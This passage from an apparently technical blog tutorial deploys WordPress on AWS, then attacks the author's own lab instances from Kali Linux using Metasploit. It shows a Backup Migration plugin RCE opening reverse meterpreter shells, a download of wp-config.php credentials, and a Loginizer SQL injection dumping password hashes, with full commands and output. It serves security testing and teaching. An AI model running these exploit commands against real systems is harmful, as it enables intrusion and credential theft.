  WORDPRESS_USERNAME: /copilot/wordpress/dev/secrets/WORDPRESS_USERNAME
  WORDPRESS_PASSWORD: /copilot/wordpress/dev/secrets/WORDPRESS_PASSWORD
</span><span class="no">EOF
</span></pre></table></code></div></div><p>Create an Aurora DB to be used by the backend service:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>copilot storage init <span class="nt">--name</span> wordpress-cluster <span class="nt">--lifecycle</span><span class="o">=</span>workload <span class="se">\</span>
  <span class="nt">--storage-type</span> Aurora <span class="nt">--engine</span> MySQL <span class="nt">--initial-db</span> <span class="s2">"</span><span class="k">${</span><span class="nv">MARIADB_WORDPRESS_DATABASE</span><span class="k">}</span><span class="s2">"</span>
</pre></table></code></div></div><p>Deploy the backend service:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>copilot svc deploy <span class="nt">--resource-tags</span> <span class="s2">"Owner=</span><span class="k">${</span><span class="nv">USER</span><span class="k">}</span><span class="s2">,Environment=dev,Solution=Amazon-ECS"</span>
</pre></table></code></div></div><p>Get the details of the deployed service:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">COPILOT_PUBLIC_IP</span><span class="o">=</span><span class="si">$(</span>copilot svc show <span class="nt">--name</span> wordpress <span class="nt">--json</span> | jq <span class="nt">-r</span> <span class="s1">'.routes[].url'</span><span class="si">)</span>
copilot svc show <span class="nt">--name</span> wordpress
</pre></table></code></div></div><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre><td class="rouge-code"><pre><span class="go">About

  Application  wordpress
  Name         wordpress
  Type         Load Balanced Web Service

Configurations

  Environment  Tasks     CPU (vCPU)  Memory (MiB)  Platform      Port
  -----------  -----     ----------  ------------  --------      ----
  dev          1         0.25        512           LINUX/X86_64  8080

Routes

  Environment  URL
  -----------  ---
  dev          http://wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com

Internal Service Endpoints

  Endpoint                            Environment  Type
  --------                            -----------  ----
  wordpress:8080                      dev          Service Connect
  wordpress.dev.wordpress.local:8080  dev          Service Discovery

Variables

  Name                                Container  Environment  Value
  ----                                ---------  -----------  -----
  COPILOT_APPLICATION_NAME            wordpress  dev          wordpress
  COPILOT_ENVIRONMENT_NAME              "          "          dev
  COPILOT_LB_DNS                        "          "          wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com
  COPILOT_SERVICE_DISCOVERY_ENDPOINT    "          "          dev.wordpress.local
  COPILOT_SERVICE_NAME                  "          "          wordpress
  WORDPRESSCLUSTER_SECURITY_GROUP       "          "          sg-0877803062b02c1ac

Secrets

  Name                     Container  Environment  Value From
  ----                     ---------  -----------  ----------
  WORDPRESSCLUSTER_SECRET  wordpress  dev          arn:aws:secretsmanager:eu-central-1:729560437327:secret:wordpressclusterAuroraSecre-2q9Fj1KRUkQL-VV3pqy
  WORDPRESS_PASSWORD         "          "          parameter//copilot/wordpress/dev/secrets/WORDPRESS_PASSWORD
  WORDPRESS_USERNAME         "          "          parameter//copilot/wordpress/dev/secrets/WORDPRESS_USERNAME
</span></pre></table></code></div></div><p>Summarize the WordPress URL, Admin URL, Username and Password:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"WordPress URL: </span><span class="k">${</span><span class="nv">COPILOT_PUBLIC_IP</span><span class="k">}</span><span class="s2">/"</span>
<span class="nb">echo</span> <span class="s2">"WordPress Admin URL: </span><span class="k">${</span><span class="nv">COPILOT_PUBLIC_IP</span><span class="k">}</span><span class="s2">/wp-admin/"</span>
<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"Username: </span><span class="k">${</span><span class="nv">WORDPRESS_USERNAME</span><span class="k">}</span><span class="se">\n</span><span class="s2">Password: </span><span class="k">${</span><span class="nv">WORDPRESS_PASSWORD</span><span class="k">}</span><span class="s2">"</span>
</pre></table></code></div></div><p>Handy ECS links:</p><ul><li><a href="https://community.aws/content/2djhTaf6woZwSQPAEt94ScYWWDv/ci-cd-pipelines-for-two-connected-services-using-aws-copilot?lang=en">Build Efficient CI/CD Pipelines for Connected Microservices in Under an Hour Using AWS Copilot</a><li><a href="https://github.com/bvtujo/copilot-wordpress">Wordpress on Copilot</a></ul><h2 id="attack-the-wordpress-application"><span class="me-2">Attack the Wordpress Application</span><a href="#attack-the-wordpress-application" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The following part describes using the Metasploit Framework to exploit vulnerabilities in the <a href="https://wordpress.org/plugins/backup-backup/">WordPress Backup Migration Plugin</a> and <a href="https://wordpress.org/plugins/loginizer/">Loginizer</a> plugins.</p><p>Details about the WordPress plugin vulnerabilities can be found here:</p><ul><li><a href="https://wordpress.org/plugins/backup-backup/">WordPress Backup Migration Plugin</a><ul><li><a href="https://www.rapid7.com/db/modules/exploit/multi/http/wp_backup_migration_php_filter/">WordPress Backup Migration Plugin PHP Filter Chain RCE</a><li><a href="https://www.cvedetails.com/cve/CVE-2023-6553/">Vulnerability Details : CVE-2023-6553</a><li><a href="https://github.com/Chocapikk/CVE-2023-6553">CVE-2023-6553 Exploit V2</a><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-6553">CVE-2023-6553 Detail</a><li><a href="https://github.com/rapid7/metasploit-framework/blob/6d8666e35b96b3c16e63acb57381b5efdcafb0d0/documentation/modules/exploit/multi/http/wp_backup_migration_php_filter.md">Unauth RCE in the WordPress plugin: Backup Migration (&lt;= 1.3.7)</a></ul><li><a href="https://wordpress.org/plugins/loginizer/">Loginizer</a><ul><li><a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/wp_loginizer_log_sqli/">WordPress Loginizer log SQLi Scanner</a><li><a href="https://www.cvedetails.com/cve/CVE-2020-27615/">Vulnerability Details : CVE-2020-27615</a><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-27615">CVE-2020-27615 Detail</a><li><a href="https://github.com/rapid7/metasploit-framework/blob/980230e5f1b8b34656f75eda1d5fde47cfd9866c/documentation/modules/auxiliary/scanner/http/wp_loginizer_log_sqli.md">Loginizer timebased SQL injection in versions before 1.6.4</a></ul></ul><p>Log in to the Kali Linux instance using SSH and perform the following steps:</p><ul><li>Use the <code class="language-plaintext highlighter-rouge">wp_backup_migration_php_filter</code> and <code class="language-plaintext highlighter-rouge">wp_loginizer_log_sqli</code> Metasploit modules to exploit the WordPress plugin vulnerabilities<li>Execute <code class="language-plaintext highlighter-rouge">sysinfo</code> to get details about the remote system<li>Download the WordPress config file <code class="language-plaintext highlighter-rouge">wp-config.php</code>, which contains database credentials</ul><p>Allow your user to connect to the Kali Linux instance using SSH and then install Metasploit:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nv">AWS_EC2_KALI_LINUX_PUBLIC_IP</span><span class="o">=</span><span class="si">$(</span>aws ec2 describe-instances <span class="nt">--filters</span> <span class="s2">"Name=tag:Solution,Values=</span><span class="k">${</span><span class="nv">SOLUTION_KALI</span><span class="k">}</span><span class="s2">"</span> <span class="nt">--query</span> <span class="s2">"Reservations[].Instances[].PublicIpAddress"</span> <span class="nt">--output</span> text<span class="si">)</span>
ssh <span class="nt">-i</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/</span><span class="k">${</span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="k">}</span><span class="s2">.pem"</span> <span class="nt">-o</span> <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no <span class="s2">"kali@</span><span class="k">${</span><span class="nv">AWS_EC2_KALI_LINUX_PUBLIC_IP</span><span class="k">}</span><span class="s2">"</span> <span class="s1">'curl -Ls https://github.com/ruzickap.keys &gt;&gt; ~/.ssh/authorized_keys'</span>
scp <span class="nt">-i</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/</span><span class="k">${</span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="k">}</span><span class="s2">.pem"</span> <span class="nt">-o</span> <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/</span><span class="k">${</span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="k">}</span><span class="s2">.pem"</span> <span class="s2">"kali@</span><span class="k">${</span><span class="nv">AWS_EC2_KALI_LINUX_PUBLIC_IP</span><span class="k">}</span><span class="s2">"</span>:~
ssh <span class="nt">-i</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/</span><span class="k">${</span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="k">}</span><span class="s2">.pem"</span> <span class="nt">-o</span> <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no <span class="s2">"kali@</span><span class="k">${</span><span class="nv">AWS_EC2_KALI_LINUX_PUBLIC_IP</span><span class="k">}</span><span class="s2">"</span> <span class="o">&lt;&lt;</span> <span class="no">EOF</span><span class="sh">
touch ~/.hushlogin
sudo snap install metasploit-framework
msfdb init
</span><span class="no">EOF
</span></pre></table></code></div></div><p><a href="https://user-images.githubusercontent.com/63872951/187396388-1c15dd6e-95a0-438a-ada5-71e49ff17f4e.jpg" class="popup img-link shimmer"><img src="https://user-images.githubusercontent.com/63872951/187396388-1c15dd6e-95a0-438a-ada5-71e49ff17f4e.jpg" alt="Metasploit" width="500" loading="lazy"></a> <em>Metasploit logo</em></p><p>Run the Metasploit Framework and exploit the vulnerability in all three environments (ECS, EC2 with Docker, and a standalone EC2 instance):</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="c"># shellcheck disable=SC2087</span>
<span class="k">for </span>PUBLIC_IP <span class="k">in</span> <span class="k">${</span><span class="nv">COPILOT_PUBLIC_IP</span><span class="k">}</span> <span class="k">${</span><span class="nv">AWS_EC2_CONTAINER_PUBLIC_IP</span><span class="k">}</span> <span class="k">${</span><span class="nv">AWS_EC2_PUBLIC_IP</span><span class="k">}</span><span class="p">;</span> <span class="k">do
  </span><span class="nb">echo</span> <span class="s2">"*** </span><span class="k">${</span><span class="nv">PUBLIC_IP</span><span class="k">}</span><span class="s2">"</span>
  ssh <span class="nt">-i</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/</span><span class="k">${</span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="k">}</span><span class="s2">.pem"</span> <span class="nt">-o</span> <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no <span class="s2">"kali@</span><span class="k">${</span><span class="nv">AWS_EC2_KALI_LINUX_PUBLIC_IP</span><span class="k">}</span><span class="s2">"</span> <span class="o">&lt;&lt;</span> <span class="no">EOF2</span><span class="sh">
cat &lt;&lt; EOF | msfconsole --quiet --resource -
use exploit/multi/http/wp_backup_migration_php_filter
set rhost </span><span class="k">${</span><span class="nv">PUBLIC_IP</span><span class="k">}</span><span class="sh">
set lhost </span><span class="k">${</span><span class="nv">AWS_EC2_KALI_LINUX_PUBLIC_IP</span><span class="k">}</span><span class="sh">
set lport 443
run --no-interact
sessions --interact 1 --meterpreter-command ps --meterpreter-command sysinfo </span><span class="se">\</span><span class="sh">
  --meterpreter-command "download /bitnami/wordpress/wp-config.php"
use auxiliary/scanner/http/wp_loginizer_log_sqli
set rhost </span><span class="k">${</span><span class="nv">PUBLIC_IP</span><span class="k">}</span><span class="sh">
set verbose true
run
exit -y
EOF
</span><span class="no">EOF2
</span><span class="k">done</span>
</pre></table></code></div></div><p>The output below was shortened, showing only the attack against WordPress on Amazon ECS:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
</pre><td class="rouge-code"><pre><span class="go">*** http://wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com

 ** Welcome to Metasploit Framework Initial Setup **
    Please answer a few questions to get started.



 ** Metasploit Framework Initial Setup Complete **

Running the 'init' command for the database:
Existing database found, attempting to start it
Starting database at /home/kali/snap/metasploit-framework/common/.msf4/db...server starting
success
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
[*] Processing stdin for ERB directives.
</span><span class="gp">resource (stdin)&gt;</span><span class="w"> </span>use exploit/multi/http/wp_backup_migration_php_filter
<span class="go">[*] Using configured payload php/meterpreter/reverse_tcp

</span><span class="gp">resource (stdin)&gt;</span><span class="w"> </span><span class="nb">set </span>rhost http://wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com
<span class="gp">rhost =&gt;</span><span class="w"> </span>http://wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com
<span class="go">
</span><span class="gp">resource (stdin)&gt;</span><span class="w"> </span><span class="nb">set </span>lhost 18.185.154.248
<span class="gp">lhost =&gt;</span><span class="w"> </span>18.185.154.248
<span class="go">
</span><span class="gp">resource (stdin)&gt;</span><span class="w"> </span><span class="nb">set </span>lport 443
<span class="gp">lport =&gt;</span><span class="w"> </span>443
<span class="go">
</span><span class="gp">resource (stdin)&gt;</span><span class="w"> </span>run <span class="nt">--no-interact</span>
<span class="go">[*] Exploiting target 18.158.31.183
[-] Handler failed to bind to 18.185.154.248:443:-  -
[*] Started reverse TCP handler on 0.0.0.0:443
[*] Running automatic check ("set AutoCheck false" to disable)
[*] WordPress Version: 6.5.3
[+] Detected Backup Migration Plugin version: 1.3.7
[+] The target appears to be vulnerable.
[*] Writing the payload to disk, character by character, please wait...
[*] Sending stage (39927 bytes) to 3.71.92.221
[+] Deleted Y
[+] Deleted pLqV.php
</span><span class="gp">[*] Meterpreter session 1 opened (10.192.10.69:443 -&gt;</span><span class="w"> </span>3.71.92.221:40930<span class="o">)</span> at 2024-06-01 18:18:03 +0000
<span class="go">[*] Session 1 created in the background.
[*] Exploiting target 18.194.82.16
[-] Handler failed to bind to 18.185.154.248:443:-  -
[*] Started reverse TCP handler on 0.0.0.0:443
[*] Running automatic check ("set AutoCheck false" to disable)
[*] WordPress Version: 6.5.3
[+] Detected Backup Migration Plugin version: 1.3.7
[+] The target appears to be vulnerable.
[*] Writing the payload to disk, character by character, please wait...
[*] Sending stage (39927 bytes) to 3.71.92.221
[+] Deleted d
[+] Deleted pLqV.php
</span><span class="gp">[*] Meterpreter session 2 opened (10.192.10.69:443 -&gt;</span><span class="w"> </span>3.71.92.221:35022<span class="o">)</span> at 2024-06-01 18:19:07 +0000
<span class="go">[*] Session 2 created in the background.

</span><span class="gp">resource (stdin)&gt;</span><span class="w"> </span>sessions <span class="nt">--interact</span> 1 <span class="nt">--meterpreter-command</span> ps <span class="nt">--meterpreter-command</span> sysinfo   <span class="nt">--meterpreter-command</span> <span class="s2">"download /bitnami/wordpress/wp-config.php"</span>
<span class="go">[*] Running 'ps' on meterpreter session 1 (18.158.31.183)

Process List
============

 PID  Name                                              User  Path
 ---  ----                                              ----  ----
 1    /bin/sh                                           1001  /bin/sh -c /opt/copilot/scripts/startup.sh
 8    /bin/sh                                           1001  /bin/sh /opt/copilot/scripts/startup.sh
 15   /managed-agents/execute-command/amazon-ssm-agent  root  /managed-agents/execute-command/amazon-ssm-agent
 30   /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 60   /managed-agents/execute-command/ssm-agent-worker  root  /managed-agents/execute-command/ssm-agent-worker
 345  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 346  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 347  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 348  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 349  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 350  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 352  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 406  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 407  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
 408  /opt/bitnami/apache/bin/httpd                     1001  /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
</span><span class="gp"> 419  sh                                                1001  sh -c ps ax -w -o pid,user,cmd --no-header 2&gt;</span>/dev/null
<span class="go"> 420  ps                                                1001  ps ax -w -o pid,user,cmd --no-header

[*] Running 'sysinfo' on meterpreter session 1 (18.158.31.183)
Computer    : ip-10-0-0-38.eu-central-1.compute.internal
</span><span class="gp">OS          : Linux ip-10-0-0-38.eu-central-1.compute.internal 5.10.215-203.850.amzn2.x86_64 #</span>1 SMP Tue Apr 23 20:32:19 UTC 2024 x86_64
<span class="go">Meterpreter : php/linux
[*] Running 'download /bitnami/wordpress/wp-config.php' on meterpreter session 1 (18.158.31.183)
</span><span class="gp">[*] Downloading: /bitnami/wordpress/wp-config.php -&gt;</span><span class="w"> </span>/home/kali/wp-config.php
<span class="gp">[*] Downloaded 4.28 KiB of 4.28 KiB (100.0%): /bitnami/wordpress/wp-config.php -&gt;</span><span class="w"> </span>/home/kali/wp-config.php
<span class="gp">[*] Completed  : /bitnami/wordpress/wp-config.php -&gt;</span><span class="w"> </span>/home/kali/wp-config.php
<span class="go">
</span><span class="gp">resource (stdin)&gt;</span><span class="w"> </span>use auxiliary/scanner/http/wp_loginizer_log_sqli
<span class="go">
</span><span class="gp">resource (stdin)&gt;</span><span class="w"> </span><span class="nb">set </span>rhost http://wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com
<span class="gp">rhost =&gt;</span><span class="w"> </span>http://wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com
<span class="go">
</span><span class="gp">resource (stdin)&gt;</span><span class="w"> </span><span class="nb">set </span>verbose <span class="nb">true</span>
<span class="gp">verbose =&gt;</span><span class="w"> </span><span class="nb">true</span>
<span class="go">
</span><span class="gp">resource (stdin)&gt;</span><span class="w"> </span>run
<span class="go">[*] Checking /wp-content/plugins/loginizer/readme.txt
[*] Found version 1.6.3 in the plugin
[+] Vulnerable version of Loginizer detected
</span><span class="gp">[*] {SQLi} Executing (select group_concat(JC) from (select cast(concat_ws(';</span><span class="s1">',ifnull(user_login,''),ifnull(user_pass,'')) as binary) JC from wp_users limit 1) JIVez)
</span><span class="go">[*] {SQLi} Time-based injection: expecting output of length 44
[+] wp_users
========

 user_login  user_pass
 ----------  ---------
</span><span class="gp"> wordpress   $</span>P<span class="nv">$B8OjOUCRrPXm</span>/TrVQ2/WJqUp5w7WmI.
<span class="go">
[*] Scanned 1 of 2 hosts (50% complete)
[*] Checking /wp-content/plugins/loginizer/readme.txt
[*] Found version 1.6.3 in the plugin
[+] Vulnerable version of Loginizer detected
[*] Scanned 1 of 2 hosts (50% complete)
</span><span class="gp">[*] {SQLi} Executing (select group_concat(TXChHXg) from (select cast(concat_ws(';</span><span class="s1">',ifnull(user_login,''),ifnull(user_pass,'')) as binary) TXChHXg from wp_users limit 1) fA)
</span><span class="go">[*] Scanned 1 of 2 hosts (50% complete)
[*] Scanned 1 of 2 hosts (50% complete)
[*] Scanned 1 of 2 hosts (50% complete)
[*] {SQLi} Time-based injection: expecting output of length 44
[+] wp_users
========

 user_login  user_pass
 ----------  ---------
</span><span class="gp"> wordpress   $</span>P<span class="nv">$B8OjOUCRrPXm</span>/TrVQ2/WJqUp5w7WmI.
<span class="go">
[*] Scanned 2 of 2 hosts (100% complete)
[*] Auxiliary module execution completed

</span><span class="gp">resource (stdin)&gt;</span><span class="w"> </span><span class="nb">exit</span> <span class="nt">-y</span>
</pre></table></code></div></div><p>From the outputs above, you can see the attack against WordPress was successful. We obtained details about the remote system, such as a list of processes, the <code class="language-plaintext highlighter-rouge">wp-config.php</code> file, system details, and a list of users with their password hashes.</p><h2 id="cleanup"><span class="me-2">Cleanup</span><a href="#cleanup" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Delete the Amazon EKS cluster, EC2 instances, VPCs, EC2 Key Pair, DB snapshots, SSM parameters, and CloudWatch Log Groups:</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">AWS_REGION</span><span class="o">=</span><span class="s2">"eu-central-1"</span>
<span class="nb">export </span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="o">=</span><span class="s2">"wordpress-test"</span>
<span class="nb">export </span><span class="nv">SOLUTION_KALI</span><span class="o">=</span><span class="s2">"KaliLinux-NICE-DCV"</span>
<span class="nb">export </span><span class="nv">SOLUTION_EC2_CONTAINER</span><span class="o">=</span><span class="s2">"Amazon-EC2-Container"</span>
<span class="nb">export </span><span class="nv">SOLUTION_EC2</span><span class="o">=</span><span class="s2">"Amazon-EC2"</span>

aws cloudformation delete-stack <span class="nt">--stack-name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">SOLUTION_KALI</span><span class="k">}</span><span class="s2">"</span>
aws cloudformation delete-stack <span class="nt">--stack-name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">SOLUTION_EC2_CONTAINER</span><span class="k">}</span><span class="s2">"</span>
aws cloudformation delete-stack <span class="nt">--stack-name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">SOLUTION_EC2</span><span class="k">}</span><span class="s2">"</span>
aws cloudformation delete-stack <span class="nt">--stack-name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">SOLUTION_KALI</span><span class="k">}</span><span class="s2">-VPC"</span>
aws cloudformation delete-stack <span class="nt">--stack-name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">SOLUTION_EC2_CONTAINER</span><span class="k">}</span><span class="s2">-VPC"</span>
aws cloudformation delete-stack <span class="nt">--stack-name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">SOLUTION_EC2</span><span class="k">}</span><span class="s2">-VPC"</span>
aws ec2 delete-key-pair <span class="nt">--key-name</span> <span class="s2">"</span><span class="k">${</span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="k">}</span><span class="s2">"</span>
<span class="k">for </span>FILE <span class="k">in</span> <span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span>/<span class="o">{</span>vpc_cloudformation_template.yml,KaliLinux-NICE-DCV.yaml,UbuntuLinux-2204-LAMP-server.yaml,AmazonLinux-2023-LAMP-server.yaml,<span class="k">${</span><span class="nv">AWS_EC2_KEY_PAIR_NAME</span><span class="k">}</span>.pem,wordpress_plugin_install.sh,Dockerfile,startup.sh<span class="o">}</span><span class="p">;</span> <span class="k">do
  if</span> <span class="o">[[</span> <span class="nt">-f</span> <span class="s2">"</span><span class="k">${</span><span class="nv">FILE</span><span class="k">}</span><span class="s2">"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
    </span><span class="nb">rm</span> <span class="nt">-v</span> <span class="s2">"</span><span class="k">${</span><span class="nv">FILE</span><span class="k">}</span><span class="s2">"</span>
  <span class="k">else
    </span><span class="nb">echo</span> <span class="s2">"*** File not found: </span><span class="k">${</span><span class="nv">FILE</span><span class="k">}</span><span class="s2">"</span>
  <span class="k">fi
done
if </span>copilot app <span class="nb">ls</span> | <span class="nb">grep </span>wordpress<span class="p">;</span> <span class="k">then
  </span>copilot app delete <span class="nt">--name</span> wordpress <span class="nt">--yes</span>
  <span class="k">if</span> <span class="o">[[</span> <span class="nt">-d</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/copilot"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
    </span><span class="nb">rm</span> <span class="nt">-rf</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP_DIR</span><span class="k">}</span><span class="s2">/copilot"</span>
  <span class="k">fi
fi
if </span>aws ssm get-parameter <span class="nt">--name</span> /copilot/wordpress/dev/secrets/WORDPRESS_USERNAME<span class="p">;</span> <span class="k">then
  </span>aws ssm delete-parameter <span class="nt">--name</span> /copilot/wordpress/dev/secrets/WORDPRESS_USERNAME
<span class="k">fi
if </span>aws ssm get-parameter <span class="nt">--name</span> /copilot/wordpress/dev/secrets/WORDPRESS_PASSWORD<span class="p">;</span> <span class="k">then
  </span>aws ssm delete-parameter <span class="nt">--name</span> /copilot/wordpress/dev/secrets/WORDPRESS_PASSWORD
<span class="k">fi
</span>aws logs describe-log-groups <span class="nt">--log-group-name-prefix</span> /aws/lambda/wordpress-dev-wordpress <span class="nt">--query</span> <span class="s1">'logGroups[*].logGroupName'</span> | jq <span class="nt">-r</span> <span class="s1">'.[]'</span> | xargs <span class="nt">-I</span> <span class="o">{}</span> aws logs delete-log-group <span class="nt">--log-group-name</span> <span class="o">{}</span>
aws rds describe-db-cluster-snapshots <span class="nt">--query</span> <span class="s2">"DBClusterSnapshots[?starts_with(DBClusterSnapshotIdentifier, </span><span class="se">\`</span><span class="s2">wordpress-dev-wordpress</span><span class="se">\`</span><span class="s2">) == </span><span class="se">\`</span><span class="s2">true</span><span class="se">\`</span><span class="s2">].DBClusterSnapshotIdentifier"</span> | jq <span class="nt">-r</span> <span class="s1">'.[]'</span> | xargs <span class="nt">-I</span> <span class="o">{}</span> aws rds delete-db-cluster-snapshot <span class="nt">--db-cluster-snapshot-identifier</span> <span class="o">{}</span>
